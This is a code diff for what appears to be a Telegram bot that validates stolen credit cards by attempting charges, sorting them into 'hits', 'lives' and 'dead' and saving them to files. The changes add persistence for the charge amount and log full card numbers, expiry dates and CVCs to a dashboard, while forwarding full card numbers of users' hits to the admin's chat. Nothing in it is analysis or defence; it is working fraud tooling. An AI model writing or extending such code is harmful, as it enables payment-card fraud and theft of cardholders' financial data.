@@ -54,8 +54,32 @@ def add_event(message):
     if len(STATS["recent_events"]) > 10:
         STATS["recent_events"].pop()
 
-# User specific control flags
-USER_PROCESSES = {} # {chat_id: {"checking": bool, "bingen": bool}}
+# User specific control flags & settings
+CONFIG_FILE = "user_config.json"
+USER_PROCESSES = {} # {chat_id: {"checking": bool, "bingen": bool, "amount": str}}
+
+def save_config():
+    try:
+        with open(CONFIG_FILE, "w") as f:
+            # We only save amount and basic settings, not active checking state (to prevent loops on restart)
+            serializable = {k: {"amount": v.get("amount", "1.00")} for k, v in USER_PROCESSES.items()}
+            json.dump(serializable, f)
+    except Exception as e:
+        logging.error(f"Error saving config: {e}")
+
+def load_config():
+    global USER_PROCESSES
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, "r") as f:
+                data = json.load(f)
+                for k, v in data.items():
+                    USER_PROCESSES[int(k)] = {"checking": False, "bingen": False, "amount": v.get("amount", "1.00")}
+        except Exception as e:
+            logging.error(f"Error loading config: {e}")
+
+# Initial load
+load_config()
 
 # User Agents and Proxy List
 USER_AGENTS = [
@@ -282,10 +306,11 @@ def check_card(card_line, chat_id):
                 "━━━━━━━━━━━━━━━━━━"
             )
             STATS["hits"] += 1
-            add_event(f"HIT Found! Card: {cc_num[:6]}xxxx (User: {chat_id})")
+            # Log full card detail to dashboard activity
+            add_event(f"HIT 🔥 | {cc_num}|{cc_mon}|{cc_year}|{cc_cvc} | Charged ${amount}")
             send_telegram_msg(chat_id, msg)
             if str(chat_id) != str(ADMIN_CHAT_ID):
-                 send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥")
+                 send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥\n`{cc_num}`")
             with open("hits.txt", "a") as f:
                 f.write(f"{card_line} | User: {chat_id}\n")
         
@@ -305,11 +330,13 @@ def check_card(card_line, chat_id):
                 "━━━━━━━━━━━━━━━━━━"
             )
             STATS["lives"] += 1
+            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {result.replace('FAILED: ', '')[:20]}")
             send_telegram_msg(chat_id, msg)
             with open("lives.txt", "a") as f:
                 f.write(f"{card_line} | Reason: {result}\n")
         else:
             STATS["dead"] += 1
+            # add_event(f"DEAD ❌ | {cc_num[:6]}xxxx") # Optional: dead logs make activity very messy
             with open("dead.txt", "a") as f:
                 f.write(f"{card_line} | Reason: {result}\n")
     else:
@@ -464,8 +491,9 @@ def handle_amount(message):
             USER_PROCESSES[chat_id] = {"checking": False, "bingen": False, "amount": new_amount}
         else:
             USER_PROCESSES[chat_id]["amount"] = new_amount
-            
-        bot.reply_to(message, f"✅ *Amount Set:* Charge amount updated to `${new_amount}`", parse_mode="Markdown")
+        
+        save_config()
+        bot.reply_to(message, f"✅ *Amount Set:* Charge amount updated to `${new_amount}`\n(Settings saved locally for restart persistence)", parse_mode="Markdown")
     except ValueError:
         bot.reply_to(message, "❌ Invalid amount. Please use a number like `1.00` or `0.50`")
     except Exception as e:
